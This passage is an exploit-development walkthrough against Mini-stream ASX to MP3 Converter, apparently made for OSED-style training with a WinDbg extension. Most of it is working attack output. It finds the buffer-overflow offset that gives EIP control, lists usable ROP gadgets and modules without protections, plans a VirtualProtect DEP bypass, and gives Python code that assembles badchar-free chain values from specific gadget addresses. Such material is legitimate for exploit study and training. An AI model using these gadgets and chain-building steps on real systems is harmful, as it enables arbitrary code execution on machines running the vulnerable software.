Address     Module                                                               Score  Terminator  Reads                  Writes                      MemoryReads         MemoryWrites  StackDelta       Capabilities                                                                                      Sequence               
----------  -------------------------------------------------------------------  -----  ----------  ---------------------  --------------------------  ------------------  ------------  ---------------  ------------------------------------------------------------------------------------------------  -----------------------
0x1002A649  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)       exact(exact=eax, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop eax ; ret          
0x1002FE81  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  75     RETURN      exact(exact=eax, esp)  exact(exact=eax, esp)       none                none          exact(exact=4)   STACK_PIVOT, EXCHANGE_REGISTER, REGISTER_SWAP, DISPATCH_RET                                       xchg eax, esp ; ret    
0x10016C87  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=eax, esp)  exact(exact=eax, esp)       none                none          exact(exact=4)   REGISTER_INCREMENT, DISPATCH_RET                                                                  inc eax ; ret          
0x1005B5DB  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=eax, esp)  exact(exact=eax, esp)       none                none          exact(exact=4)   REGISTER_NEGATE, DISPATCH_RET                                                                     neg eax ; ret          
0x1002F696  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)       exact(exact=eax, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop eax ; pop ebp ; ret
0x1003023B  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)       exact(exact=eax, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop eax ; pop esi ; ret
0x10031659  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)       exact(exact=ebx, eax, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop eax ; ret
0x10027F59  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  75     RETURN      exact(exact=eax, esp)  exact(exact=eax, esp)       exact(exact=[eax])  none          exact(exact=4)   MEMORY_READ, LOAD_MEMORY, DISPATCH_RET                                                            mov eax, [eax] ; ret   
0x03E522FB  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  85     RETURN      exact(exact=eax, esp)  exact(exact=eax, esp)       none                none          exact(exact=4)   REGISTER_DECREMENT, DISPATCH_RET                                                                  dec eax ; ret          
@$osed().rop.query("writes", "eax")                 : ROP Query: 9 rows
    title            : ROP Query
    rows             : ROP Query: 9 rows; expand rows[N] for details
    length           : 0x9
```

```text
0:000> dx @$osed().rop.query("writes", "ecx")

=== ROP Query ===
Address     Module                                                               Score  Terminator  Reads             Writes                      MemoryReads         MemoryWrites  StackDelta       Capabilities                                                                                      Sequence               
----------  -------------------------------------------------------------------  -----  ----------  ----------------  --------------------------  ------------------  ------------  ---------------  ------------------------------------------------------------------------------------------------  -----------------------
0x03E51AC9  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  85     RETURN      exact(exact=esp)  exact(exact=ecx, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop ecx ; ret          
0x03E823C8  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, esp)       exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop ecx ; pop ecx ; ret
0x03E880C7  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, ebx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ecx ; pop ebx ; ret
0x03E83C39  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ecx ; pop esi ; ret
0x03E541A9  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, ecx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop ecx ; ret
0x03E5F071  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  55     RETURN      exact(exact=esp)  exact(exact=esi, ecx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop esi ; pop ecx ; ret
0x10032CB4  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ecx ; pop ebp ; ret
0x1001096D  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebp, ecx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebp ; pop ecx ; ret
@$osed().rop.query("writes", "ecx")                 : ROP Query: 8 rows
    title            : ROP Query
    rows             : ROP Query: 8 rows; expand rows[N] for details
    length           : 0x8
0:000> dx @$osed().rop.query("writes", "edx")

=== ROP Query ===
Address     Module                                                               Score  Terminator  Reads             Writes                 MemoryReads         MemoryWrites  StackDelta      Capabilities                                            Sequence     
----------  -------------------------------------------------------------------  -----  ----------  ----------------  ---------------------  ------------------  ------------  --------------  ------------------------------------------------------  -------------
0x10029697  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=edx, esp)  exact(exact=[esp])  none          exact(exact=8)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop edx ; ret
@$osed().rop.query("writes", "edx")                 : ROP Query: 1 row
    title            : ROP Query
    rows             : ROP Query: 1 row; expand rows[N] for details
    length           : 0x1
0:000> dx @$osed().rop.query("writes", "eax")

=== ROP Query ===
Address     Module                                                               Score  Terminator  Reads                  Writes                      MemoryReads         MemoryWrites  StackDelta       Capabilities                                                                                      Sequence               
----------  -------------------------------------------------------------------  -----  ----------  ---------------------  --------------------------  ------------------  ------------  ---------------  ------------------------------------------------------------------------------------------------  -----------------------
0x03E84AE5  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  85     RETURN      exact(exact=esp)       exact(exact=eax, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop eax ; ret          
0x03E8C9B9  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  75     RETURN      exact(exact=eax, esp)  exact(exact=eax, esp)       none                none          exact(exact=4)   STACK_PIVOT, EXCHANGE_REGISTER, REGISTER_SWAP, DISPATCH_RET                                       xchg eax, esp ; ret    
0x03E51C34  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  85     RETURN      exact(exact=eax, esp)  exact(exact=eax, esp)       none                none          exact(exact=4)   REGISTER_INCREMENT, DISPATCH_RET                                                                  inc eax ; ret          
0x03E522FB  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  85     RETURN      exact(exact=eax, esp)  exact(exact=eax, esp)       none                none          exact(exact=4)   REGISTER_DECREMENT, DISPATCH_RET                                                                  dec eax ; ret          
0x03E520F9  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  85     RETURN      exact(exact=eax, esp)  exact(exact=eax, esp)       none                none          exact(exact=4)   REGISTER_NEGATE, DISPATCH_RET                                                                     neg eax ; ret          
0x03E8AFE8  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  55     RETURN      exact(exact=esp)       exact(exact=eax, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop eax ; pop ebp ; ret
0x03E83BE5  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  55     RETURN      exact(exact=esp)       exact(exact=eax, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop eax ; pop esi ; ret
0x03E86E32  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  75     RETURN      exact(exact=eax, esp)  exact(exact=eax, esp)       exact(exact=[eax])  none          exact(exact=4)   MEMORY_READ, LOAD_MEMORY, DISPATCH_RET                                                            mov eax, [eax] ; ret   
0x10031659  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)       exact(exact=ebx, eax, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop eax ; ret
@$osed().rop.query("writes", "eax")                 : ROP Query: 9 rows
    title            : ROP Query
    rows             : ROP Query: 9 rows; expand rows[N] for details
    length           : 0x9
```

Generate a pattern. Upload the file with the pattern and then find the offset

```bash
❯ python3 exploit.py -l 18000 --offset 36695735
[*] Exact match at offset 17417
```

Our offset is 17417 and we should test this.


```text
0:015> g
(c70.1cdc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=00102ebc ecx=41414141 edx=03f50000 esi=00102ef9 edi=00000000
eip=42424242 esp=000fc480 ebp=00103384 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
42424242 ??              ???
```

Overwrote EIP with Bs

```text
0:000> dx @$osed().triage()

=== CONTROL ===
EIP controlled: yes
Offset: n/a
Pattern: n/a

=== SEH ===
Overwritten: no
Next SEH: n/a
Handler: n/a
Status: SEH chain is empty.

=== STACK ===
esp: 0x000FC480
Bad stack pointer: no
SP points into cyclic pattern: no
Stack protect: PAGE_READWRITE
DEP enforced: yes
Shellcode candidates: none

=== GADGETS ===
JMP ESP:
  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll+0x1DFF3
  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll+0x2A0D4
  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll+0x2A0E4
  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll+0x2A131
  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll+0x2A153
CALL ESP:
  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll+0x371F5
  C:\Windows\SYSTEM32\MSVCP60.dll+0x3A147
  C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.6280_none_c0dab36c38bfeda0\COMCTL32.dll+0x718B3
  C:\Windows\SYSTEM32\TextShaping.dll+0x67909
  C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.6456_none_a865dda286726b5c\comctl32.DLL+0x41D7D
POP POP RET:
  C:\Windows\System32\KERNELBASE.dll+0x1BA2DD
  C:\Windows\System32\ADVAPI32.dll+0x25385
  C:\Windows\System32\combase.dll+0xE0E00
  C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.6280_none_c0dab36c38bfeda0\COMCTL32.dll+0x50C23
  C:\Windows\System32\KERNELBASE.dll+0x1231D5
Stack pivots:
  C:\Program Files\Mini-stream\ASX to MP3 Converter\ASX2MP3Converter.exe+0x87FC
  C:\Program Files\Mini-stream\ASX to MP3 Converter\ASX2MP3Converter.exe+0x8C14
  C:\Program Files\Mini-stream\ASX to MP3 Converter\ASX2MP3Converter.exe+0x8C51
  C:\Program Files\Mini-stream\ASX to MP3 Converter\ASX2MP3Converter.exe+0x9923
  C:\Program Files\Mini-stream\ASX to MP3 Converter\ASX2MP3Converter.exe+0xC0A3

=== CONTEXT ===
Exception code: n/a
eip: 0x42424242

=== MODULE SCORE ===
Module                                                                                                                       Score   ASLR      NX_COMPAT   SafeSEH   System  
---------------------------------------------------------------------------------------------------------------------------  ------  --------  ----------  --------  --------
C:\Program Files\Mini-stream\ASX to MP3 Converter\ASX2MP3Converter.exe                                                       100     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mcodec01.dll                                                           100     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll                                                          100     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mcodec00.dll                                                           100     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mcodec02.dll                                                           100     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mctn01.dll                                                             100     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\msvos.dll                                                                  100     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter02.dll                                                          100     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSLog.dll                                                                  100     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll                                                          100     disabled  disabled    disabled  no      
C:\Windows\SYSTEM32\MSIMG32.dll                                                                                              30      enabled   enabled     disabled  yes     
C:\Windows\System32\win32u.dll                                                                                               30      enabled   enabled     disabled  yes     
C:\Windows\System32\GDI32.dll                                                                                                30      enabled   enabled     disabled  yes     
C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.6280_none_c0dab36c38bfeda0\COMCTL32.dll  25      enabled   enabled     enabled   no      
C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.6456_none_a865dda286726b5c\comctl32.DLL   25      enabled   enabled     enabled   no      
C:\Windows\SYSTEM32\WMASF.DLL                                                                                                    

=== BADCHAR QUICK SCAN ===
Byte      Count   FirstOff
--------  ------  --------
0x00      0       n/a     
0x0A      0       n/a     
0x0D      0       n/a     
@$osed().triage() : true
```


```text
0:000> dx @$osed().modules()

=== Modules ===
Module                                                                                                                       Base                Size        ASLR      NX_COMPAT   SafeSEH   System  
---------------------------------------------------------------------------------------------------------------------------  ------------------  ----------  --------  ----------  --------  --------
C:\Program Files\Mini-stream\ASX to MP3 Converter\ASX2MP3Converter.exe                                                       0x00400000          0x118000    disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mcodec01.dll                                                           0x01930000          0x7000      disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll                                                          0x03DF0000          0xA6000     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mcodec00.dll                                                           0x03EA0000          0x71000     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mcodec02.dll                                                           0x03F60000          0x11000     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mctn01.dll                                                             0x03F80000          0x12000     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\msvos.dll                                                                  0x03FB0000          0x1E000     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter02.dll                                                          0x03FE0000          0x10000     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSLog.dll                                                                  0x04010000          0x14000     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll                                                          0x10000000          0x8D000     disabled  disabled    disabled  no      
C:\Windows\SYSTEM32\WMASF.DLL                                                                                                0x555F0000          0x3D000     enabled   enabled     enabled   yes     
C:\Windows\SYSTEM32\MSVCP60.dll                                                                                              0x5ADE0000          0x70000     enabled   enabled     enabled   yes     
C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.6280_none_c0dab36c38bfeda0\COMCTL32.dll  0x5AF50000          0x8D000     enabled   enabled     enabled   no      
C:\Windows\SYSTEM32\TextShaping.dll                                                                                          0x63850000          0x95000     enabled   enabled     enabled   yes     
C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.6456_none_a865dda286726b5c\comctl32.DLL   0x642A0000          0x211000    enabled   enabled     enabled   no      
C:\Windows\SYSTEM32\textinputframework.dll                                                                                   0x66770000          0xB9000     enabled   enabled     enabled   yes     
C:\Windows\SYSTEM32\WINSPOOL.DRV                                                                                             0x67A50000          0x7D000     enabled   enabled     enabled   yes     
C:\Windows\SYSTEM32\WINMM.dll                                                                                                0x6D430000          0x28000     enabled   enabled     enabled   yes     
C:\Windows\SYSTEM32\mfperfhelper.dll                                                                                         0x70AA0000          0x106000    enabled   enabled     enabled   yes     
C:\Windows\SYSTEM32\MSIMG32.dll                                                                                              0x71390000          0x6000      enabled   enabled     disabled  yes     
C:\Windows\SYSTEM32\wintypes.dll                                                                                             0x714A0000          0xDD000     enabled   enabled     enabled   yes     
C:\Windows\System32\CoreUIComponents.dll                                                                                     0x72710000          0x27F000    enabled   enabled     enabled   yes     
C:\Windows\System32\CoreMessaging.dll                                                                                        0x72990000          0xB2000     enabled   enabled     enabled   yes     
C:\Windows\system32\uxtheme.dll                                                                                              0x731E0000          0x7D000     enabled   enabled     enabled   yes     
C:\Windows\SYSTEM32\kernel.appcore.dll                                                                                       0x735D0000          0xF000      enabled   enabled     enabled   yes     
C:\Windows\SYSTEM32\ntmarta.dll                                                                                              0x74540000          0x29000     enabled   enabled     enabled   yes     
C:\Windows\System32\bcryptPrimitives.dll                                                                                     0x75090000          0x5F000     enabled   enabled     enabled   yes     
C:\Windows\System32\win32u.dll                                                                                               0x750F0000          0x1D000     enabled   enabled     disabled  yes     
C:\Windows\System32\gdi32full.dll                                                                                            0x75110000          0xE6000     enabled   enabled     enabled   yes     
C:\Windows\System32\bcrypt.dll                                                                                               0x75200000          0x1B000     enabled   enabled     enabled   yes     
C:\Windows\System32\msvcp_win.dll                                                                                            0x75220000          0x7B000     enabled   enabled     enabled   yes     
C:\Windows\System32\ucrtbase.dll                                                                                             0x754D0000          0x120000    enabled   enabled     enabled   yes     
C:\Windows\System32\KERNELBASE.dll                                                                                           0x755F0000          0x237000    enabled   enabled     enabled   yes     
C:\Windows\System32\GDI32.dll                                                                                                0x758C0000          0x22000     enabled   enabled     disabled  yes     
C:\Windows\System32\IMM32.DLL                                                                                                0x758F0000          0x25000     enabled   enabled     enabled   yes     
C:\Windows\System32\sechost.dll                                                                                              0x75920000          0x77000     enabled   enabled     enabled   yes     
C:\Windows\System32\WS2_32.dll                                                                                               0x759A0000          0x63000     enabled   enabled     enabled   yes     
C:\Windows\System32\shcore.dll                                                                                               0x75A10000          0x87000     enabled   enabled     enabled   yes     
C:\Windows\System32\OLE32.dll                                                                                                0x75BA0000          0xE3000     enabled   enabled     enabled   yes     
C:\Windows\System32\OLEAUT32.dll                                                                                             0x75C90000          0x96000     enabled   enabled     enabled   yes     
C:\Windows\System32\comdlg32.dll                                                                                             0x75D30000          0xAF000     enabled   enabled     enabled   yes     
C:\Windows\System32\RPCRT4.dll                                                                                               0x75FB0000          0xC0000     enabled   enabled     enabled   yes     
C:\Windows\System32\SHELL32.dll                                                                                              0x76070000          0x5DB000    enabled   enabled     enabled   yes     
C:\Windows\System32\MSVCRT.dll                                                                                               0x76650000          0xBF000     enabled   enabled     enabled   yes     
C:\Windows\System32\MSCTF.dll                                                                                                0x76B50000          0xD4000     enabled   enabled     enabled   yes     
C:\Windows\System32\USER32.dll                                                                                               0x76C30000          0x17A000    enabled   enabled     enabled   yes     
C:\Windows\System32\SHLWAPI.dll                                                                                              0x76DB0000          0x49000     enabled   enabled     enabled   yes     
C:\Windows\System32\KERNEL32.DLL                                                                                             0x76E00000          0x9D000     enabled   enabled     enabled   yes     
C:\Windows\System32\ADVAPI32.dll                                                                                             0x76EA0000          0x7D000     enabled   enabled     enabled   yes     
C:\Windows\System32\combase.dll                                                                                              0x76F20000          0x280000    enabled   enabled     enabled   yes     
C:\Windows\SYSTEM32\ntdll.dll                                                                                                0x771A0000          0x19F000    enabled   enabled     enabled   yes     
C:\Windows\SYSTEM32\MFC42.DLL                                                                                                0x78F30000          0x124000    enabled   enabled     enabled   yes     
C:\Windows\SYSTEM32\WMVCore.DLL                                                                                              0x7BD20000          0x210000    enabled   enabled     enabled   yes     
Why this matters for exploitation: Mitigation triage identifies practical modules for reliable exploitation paths.
@$osed().modules() : true
```

Scanning MSA2Mfilter03.dll

```text
0:000> dx @$osed().rop.scan_live("MSA2Mfilter03.dll", "00 0A 0D")

=== Module Scan ===
[+] MSA2Mfilter03.dll: 2038 raw gadgets accepted, -1404 rejected

=== Corpus Summary ===
[+] Mode: replace
[+] Modules: MSA2Mfilter03.dll
[+] Semantic gadgets: 362 (deduplicated)
[+] Capabilities: 178
[+] Backward scanner: 2533 terminators, 1867 new gadgets
@$osed().rop.scan_live("MSA2Mfilter03.dll", "00 0A 0D")                 : Live ROP Corpus: 2 rows
    title            : Live ROP Corpus
    rows             : Live ROP Corpus: 2 rows; expand rows[N] for details
    length           : 0x2
```

VirtualProtect can be exploited here

```text
0:000> dx @$osed().rop.plan("VirtualProtect")

=== ROP Plan 1: VirtualProtect ===
Plan  Strategy        Shape                    Possible  Feasibility              Recommended  Complexity  Required                               Satisfied                              Missing  Preconditions                                                                                                                                                                                                                                                                 Reason                                                                          
----  --------------  -----------------------  --------  -----------------------  -----------  ----------  -------------------------------------  -------------------------------------  -------  ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------  --------------------------------------------------------------------------------
1     VirtualProtect  SYNTHETIC_STDCALL_FRAME  yes       exploit-state-dependent  yes          LOW         DISPATCH_RET                           DISPATCH_RET                                    EIP is controlled (e.g. via SEH overwrite or saved return address). | ESP points to or can reach a region with 24+ contiguous controlled bytes. | VirtualProtect address is known or resolvable at exploit time. | All frame values are encodable under the current charset.  All required capabilities present. Exploit-state preconditions must be verified.
1     VirtualProtect  STACK_PIVOT_FRAME        yes       exploit-state-dependent               LOW         STACK_PIVOT, DISPATCH_RET              STACK_PIVOT, DISPATCH_RET                       A controlled, writable memory region can hold the synthetic frame. | The pivot source register or memory contains a valid pointer to the controlled region. | VirtualProtect address is known or resolvable at exploit time.                                                  All required capabilities present. Exploit-state preconditions must be verified.
1     VirtualProtect  RET_DISPATCH             yes       exploit-state-dependent               LOW         DISPATCH_RET                           DISPATCH_RET                                    ESP points to a controlled region large enough for the stdcall frame. | VirtualProtect address is encodable and placed at ESP when ret executes. | Stdcall arguments follow the API address on the stack.                                                                     All required capabilities present. Exploit-state preconditions must be verified.
1     VirtualProtect  PUSHAD_DISPATCH          yes       exploit-state-dependent               MEDIUM      LOAD_CONSTANT, DISPATCH_PUSHAD         LOAD_CONSTANT, DISPATCH_PUSHAD                  Registers can be loaded with the required API arguments via pop gadgets. | The PUSHAD stack layout matches the VirtualProtect stdcall ABI. | ESP at pushad time points into the shellcode or NOP sled (used as lpAddress).                                                    All required capabilities present. Exploit-state preconditions must be verified.
1     VirtualProtect  CALL_REGISTER            yes       exploit-state-dependent               HIGH        LOAD_CONSTANT, DISPATCH_CALL_REGISTER  LOAD_CONSTANT, DISPATCH_CALL_REGISTER           The API address must be loaded into the dispatch register before call. | A valid stdcall frame for VirtualProtect must exist at [ESP] when call executes (return addr is pushed by call). | The call target must not clobber registers or stack state needed by the API.      All required capabilities present. Exploit-state preconditions must be verified.
1     VirtualProtect  JMP_REGISTER             yes       exploit-state-dependent               HIGH        LOAD_CONSTANT, DISPATCH_JMP_REGISTER   LOAD_CONSTANT, DISPATCH_JMP_REGISTER            The API address must be loaded into the dispatch register before jmp. | ESP must point to: [RETURN_ADDR][arg1][arg2]... since jmp does not push a return address. | The full VirtualProtect stdcall frame must already be on the stack.                                       All required capabilities present. Exploit-state preconditions must be verified.
@$osed().rop.plan("VirtualProtect")                 : ROP Plan 1: 6 rows
    title            : ROP Plan 1
    rows             : ROP Plan 1: 6 rows; expand rows[N] for details
    length           : 0x6
```

Synthesize the stack layout:
```text
0:000> dx @$osed().rop.synthesize(1, "SYNTHETIC_STDCALL_FRAME")

=== ROP Synthesize 1 ===
[+] Path: DIRECT_API
[+] Status: complete-with-violations
[+] Layout: produced
[+] Constraint compatible: no
[+] Strategy: VirtualProtect / SYNTHETIC_STDCALL_FRAME
[+] Total: 24 bytes
[+] Resolve before use: VIRTUALPROTECT, RETURN_ADDR, LP_ADDRESS, WRITABLE
[!] VIOLATION: dwSize: 0x00000201 contains badchar byte(s) 0x00.
[!] VIOLATION: flNewProtect = PAGE_EXECUTE_READWRITE: 0x00000040 contains badchar byte(s) 0x00.
[!] RETURN_ADDR: placeholder value must be checked against badchars after resolution.
[!] LP_ADDRESS: placeholder value must be checked against badchars after resolution.
[!] WRITABLE: placeholder value must be checked against badchars after resolution.
[!] VIRTUALPROTECT: saved EIP must contain the API address; check against badchars after resolution.
[+] Operator action: synthesize values arithmetically, use writable memory construction, or select an alternate strategy.

=== ROP Synthesize 1 ===
Plan  Strategy                                  Status                    Path        Layout    Compatible  Offset  Role                 Word            Comment                                        Diagnostic  Detail                                                                          
----  ----------------------------------------  ------------------------  ----------  --------  ----------  ------  -------------------  --------------  ---------------------------------------------  ----------  --------------------------------------------------------------------------------
1     VirtualProtect / SYNTHETIC_STDCALL_FRAME  complete-with-violations  DIRECT_API  produced  no                                                                                                                                                                                                  
                                                                                                            -4      saved-eip            VIRTUALPROTECT  saved EIP = VirtualProtect (direct overwrite)                                                                                              
                                                                                                            +0      return-address       RETURN_ADDR     return address (e.g. shellcode or jmp esp)                                                                                                 
                                                                                                            +4      arg1-lpAddress       LP_ADDRESS      lpAddress                                                                                                                                  
                                                                                                            +8      arg2-dwSize          0x00000201      dwSize                                                                                                                                     
                                                                                                            +12     arg3-flNewProtect    0x00000040      flNewProtect = PAGE_EXECUTE_READWRITE                                                                                                      
                                                                                                            +16     arg4-lpflOldProtect  WRITABLE        lpflOldProtect (writable dummy)                                                                                                            
                                                                                                                                                                                                        VIOLATION   dwSize: 0x00000201 contains badchar byte(s) 0x00.                               
                                                                                                                                                                                                        VIOLATION   flNewProtect = PAGE_EXECUTE_READWRITE: 0x00000040 contains badchar byte(s) 0x00.
@$osed().rop.synthesize(1, "SYNTHETIC_STDCALL_FRAME")                 : ROP Synthesize 1: 9 rows
    title            : ROP Synthesize 1
    rows             : ROP Synthesize 1: 9 rows; expand rows[N] for details
    length           : 0x9
```

```text
0:000> dx @$osed().rop.construct("ebx", 0x201, "00 0A 0D")

=== Value Construction: ebx = 0x00000201 ===
[+] Recipe: two-add | Stack: 20 bytes | Scratch: esi
from struct import pack
rop = b""
rop += pack("<I", 0x10031659)  # pop ebx
rop += pack("<I", 0x02020202)  # ebx = 0x02020202
rop += pack("<I", 0x100176E2)  # pop esi
rop += pack("<I", 0xFDFDFFFF)  # esi = 0xFDFDFFFF
rop += pack("<I", 0x10030C6F)  # add ebx, esi -> 0x00000201

=== Value Construction ===
Type    Value       Meaning                   
------  ----------  --------------------------
gadget  0x10031659  pop ebx                   
value   0x02020202  ebx = 0x02020202          
gadget  0x100176E2  pop esi                   
value   0xFDFDFFFF  esi = 0xFDFDFFFF          
gadget  0x10030C6F  add ebx, esi -> 0x00000201
@$osed().rop.construct("ebx", 0x201, "00 0A 0D")                 : Value Construction: 5 rows
    title            : Value Construction
    rows             : Value Construction: 5 rows; expand rows[N] for details
    length           : 0x5

0:000> dx @$osed().rop.construct("edx", 0x40, "00 0A 0D")

=== Value Construction: edx = 0x00000040 ===
[+] Recipe: two-add | Stack: 40 bytes | Scratch: ebx
from struct import pack
rop = b""
